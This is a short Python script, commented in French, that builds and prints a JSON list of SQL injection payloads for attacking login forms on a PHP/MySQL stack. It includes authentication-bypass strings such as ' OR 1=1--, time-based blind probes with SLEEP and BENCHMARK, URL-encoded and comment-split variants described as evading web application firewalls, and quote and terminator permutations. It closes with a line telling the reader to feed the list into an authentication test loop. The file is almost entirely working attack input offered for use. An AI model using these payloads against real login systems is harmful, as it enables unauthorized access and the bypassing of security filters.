# Payloads SQL Blind pour formulaire d'authentification
# Version concrète et fonctionnelle

import json

# Structure de sortie
output = {
    "boolean_true": [],
    "boolean_false": [],
    "time_based": [],
    "obfuscated": [],
    "metadata": {}
}

# Section 1: BOOLEAN TRUE (bypass auth)
true_set = [
    "' OR 1=1-- ", "' OR 1=1#", "' OR 1=1/*",
    '" OR 1=1-- ', '" OR 1=1#',
    "' OR '1'='1'-- ", "'OR'1'='1",
    "') OR 1=1-- ", ") OR 1=1-- ",
    "' UNION SELECT 1,2,3-- ", "' UNION SELECT NULL--",
    "' OR TRUE-- ", "' AND 1=1-- ",
]

# Section 2: BOOLEAN FALSE (controle baseline)
false_set = [
    "' OR 1=0-- ", "' OR 1=0#",
    "' AND 1=0-- ", "' OR FALSE--",
    "' OR '1'='2'-- ", "' OR NOT 1=1--",
]

# Section 3: TIME-BASED (MySQL SLEEP/BENCHMARK)
time_set = [
    "' OR SLEEP(5)-- ", "' OR IF(1=1, SLEEP(5), 0)--",
    "'; SELECT SLEEP(5)-- ", "' OR BENCHMARK(5000000,MD5('test'))--",
    "' OR IF(LENGTH(database())>0, SLEEP(5), 0)--",
]

# Section 4: OBFUSCATION (WAF/IPS bypass)
obf_set = [
    "%27%20OR%201%3D1--%20", "%2527%2520OR%25201%253D1%2523",
    "' OR/**/1=1-- ", "' /*!OR*/ 1=1-- ",
    "' O/**/R 1=1-- ", "' OR CHAR(79,82,49,61,49)--",
    "' Or 1=1-- ", "`OR`1`=`1`-- ",
]

# Construction avec métadonnées
for p in true_set:
    output["boolean_true"].append({
        "payload": p,
        "technique": "boolean_true",
        "description": "Retourne TRUE pour bypass authentication"
    })

for p in false_set:
    output["boolean_false"].append({
        "payload": p,
        "technique": "boolean_false",
        "description": "Retourne FALSE pour baseline de contrôle"
    })

for p in time_set:
    output["time_based"].append({
        "payload": p,
        "technique": "time_based",
        "description": "Délai conditionnel MySQL >5s"
    })

for p in obf_set:
    output["obfuscated"].append({
        "payload": p,
        "technique": "obfuscated",
        "description": "Obfuscation pour contourner filtres WAF"
    })

# Quotes styles variés
for q in ["'", '"', "`", ""]:
    output["boolean_true"].append({
        "payload": f"{q} OR 1=1-- ",
        "technique": "quote_variation",
        "description": f"Quote style: {repr(q)}"
    })

# Terminators variés
for t in ["-- ", "#", "/*", ";%00"]:
    output["boolean_true"].append({
        "payload": f"' OR 1=1{t}",
        "technique": "terminator_variation",
        "description": f"Terminator: {repr(t)}"
    })

# Métadonnées finales
output["metadata"] = {
    "environment": "PHP 5.6 / MySQL",
    "categories": {
        k: len(v) for k, v in output.items() if k != "metadata"
    }
}
output["metadata"]["total"] = sum(output["metadata"]["categories"].values())

# Affichage
print(json.dumps(output, indent=2, ensure_ascii=False))

print(f"\n=== Résumé ===")
for cat, count in output["metadata"]["categories"].items():
    print(f"{cat}: {count} payloads")
print(f"TOTAL: {output['metadata']['total']} payloads")
print("=== Utilisation ===")
print("Intégrer dans votre boucle de test d'authentification")

